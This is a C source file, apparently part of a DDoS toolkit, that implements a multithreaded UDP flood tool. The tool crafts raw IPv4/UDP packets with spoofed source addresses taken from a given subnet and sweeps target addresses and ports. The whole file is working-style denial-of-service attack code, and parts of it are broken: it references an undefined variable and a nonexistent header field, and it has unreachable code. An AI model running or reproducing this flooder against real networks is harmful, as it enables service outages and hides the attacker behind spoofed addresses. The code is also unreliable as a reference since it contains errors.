#include "../header.h"
#include "../base/make_ipv4.h"
#include "../base/subnet_mask.h"
#include "../ddos/udp_flood.h"

#define REQUEST_PER_THREAD 1000
#define DATA "Hello, This is Data!"

// session counting
unsigned long g_udp_total;
unsigned long g_udp_produced;
// from main()
char g_udp_src_ip[16] = { 0, };
char g_udp_dest_ip[16] = { 0, };
int g_udp_src_mask;
int g_udp_dest_mask;
int g_udp_dest_port_start;
int g_udp_dest_port;
// for masking next ip address
char g_udp_now_src_ip[16] = { 0, };
char g_udp_now_dest_ip[16] = { 0, };
int g_udp_now_port = 0;

pthread_mutex_t g_udp_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t g_udp_cond;

void udp_flood_print_usage(void)
{
	printf("UDP flood Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests, Default: 1 Loop] \n");
}

void *generate_udp_request(void *data)
{
	int sock = make_socket(IPPROTO_UDP);
	while (1) {
		// *** begin of critical section ***
		pthread_mutex_lock(&g_udp_mutex);
		generator(g_udp_src_ip,
		          g_udp_dest_ip,
							g_udp_src_mask,
							g_udp_dest_mask,
							g_udp_dest_port_start,
							g_udp_dest_port,
							g_udp_now_src_ip,
							g_udp_now_dest_ip,
							&g_udp_now_port);
		// make ipv4 header
		struct iphdr ipv4_h;
		ipv4_h = prepare_empty_ipv4();
		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_UDP);
		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(g_udp_now_src_ip));
		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(g_udp_now_dest_ip));
		ipv4_h = ipv4_add_size(ipv4_h, sizeof(struct udphdr));
		// make udp header 
		struct udphdr *udp_h_ptr;
		char buf[sizeof(struct udphdr)];
		memset(buf, 0x00, sizeof(struct udphdr));
		udp_h_ptr = (struct udphdr *)buf;
		udp_h_ptr->check = 0;
		udp_h_ptr->src_port = htons(0);
		udp_h_ptr->dest_port = htons(g_udp_now_port);
		strcpy(udp_h_ptr -> data, DATA);
		udp_h_ptr->len = htons(strlen(DATA));
		// thread terminate
		if (g_udp_produced >= g_udp_total) {
			pthread_mutex_unlock(&g_udp_mutex);
			pthread_cond_broadcast(&g_udp_cond);
			return 0;
		}
		// make and send packet
		char *packet = packet_assemble(ipv4_h, p, sizeof(struct udphdr));
		send_packet(sock, ipv4_h, packet, g_udp_now_port);
		free(packet);
		g_udp_produced++;
		// *** end of critical section ***
		pthread_mutex_unlock(&g_udp_mutex);
	}
	close(sock);
	return 0;
}

void udp_flood_run(char *argv[])
{
	int argc = 0;
	while (argv[argc] != NULL) {
		argc++;
	}
	if (argc != 3 && argc != 4) {
		udp_flood_print_usage();
		return;
	}
	split_ip_mask_port(argv, g_udp_src_ip, g_udp_dest_ip, &g_udp_src_mask, &g_udp_dest_mask, &g_udp_dest_port_start, &g_udp_dest_port);
	g_udp_produced = 0;

	if(argc == 4) g_udp_total = atoi(argv[3]);
	else g_udp_total = (unsigned long)pow(2, 32-g_udp_src_mask) * (unsigned long)pow(2, 32-g_udp_dest_mask) * (g_udp_dest_port-g_udp_dest_port_start+1);

	int num_threads = g_udp_total / REQUEST_PER_THREAD;

	int *generate_thread_id;
	pthread_t generate_thread[9999];

	int i;


	printf("Sending UDP requests to %s using %d threads\n",argv[1], num_threads);

	for (i = 0; i < num_threads; i++) 
		pthread_create(&generate_thread[i], NULL, generate_udp_request, NULL);

	for (i = 0; i < num_threads; i++) {
		void *status;
		pthread_join(generate_thread[i], NULL);
		printf("thread %d joined\n", i);
	}

	pthread_mutex_destroy(&g_udp_mutex);
	pthread_exit(NULL);

	printf("UDP flood finished\nTotal %lu packets sent.\n",g_udp_produced);
}
